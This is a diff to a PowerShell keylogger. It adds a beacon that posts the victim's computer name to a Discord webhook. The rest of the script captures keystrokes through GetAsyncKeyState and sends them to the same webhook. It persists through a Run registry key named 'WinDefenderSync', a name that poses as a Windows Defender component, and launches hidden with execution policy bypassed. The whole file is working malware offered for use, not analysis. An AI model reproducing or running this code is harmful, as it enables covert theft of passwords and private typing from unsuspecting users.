@@ -3,10 +3,21 @@ $W = "https://discord.com/api/webhooks/1504038539984113755/-YlOeox0lAsJLUETBjQIm
 $P = "WinDefenderSync"
 $F = "$env:LOCALAPPDATA\win_sync.ps1"
 
-# 1. The Core Logic (Fixed for PS 5.1 Parser)
+# 1. The Core Logic (Handshake + Keylogger)
 $C = @"
 `$W = '$W'; `$N = `$env:COMPUTERNAME; `$L = ''
+
+# Immediate Connection Message
+try {
+    `$ConnectPayload = @{
+        username = "GHOST_`$N"
+        content  = "⚡ [CONNECTION ESTABLISHED]: `$N is now online and logging."
+    } | ConvertTo-Json
+    Invoke-RestMethod -Uri `$W -Method Post -Body `$ConnectPayload -ContentType "application/json"
+} catch {}
+
 Add-Type -Type 'using System;using System.Runtime.InteropServices;public class K{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);]}'
+
 while(`$true){
     Start-Sleep -m 40
     for(`$i=8;`$i -le 190;`$i++){
@@ -33,7 +44,6 @@ while(`$true){
 "@
 
 # 2. Drop and Persist
-# We use -UseBasicParsing in the stager to avoid the Security Warning popup
 if (-not (Test-Path $F)) {
     $C | Out-File -FilePath $F -Encoding ascii -Force
     $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
@@ -41,5 +51,5 @@ if (-not (Test-Path $F)) {
     Set-ItemProperty -Path $RegPath -Name $P -Value $Value -Force
 }
 
-# 3. Execution
+# 3. Execution (Fire and Forget)
 Start-Process powershell.exe -ArgumentList "-W H -NoP -Exec Bypass -File `"$F`"" -WindowStyle Hidden
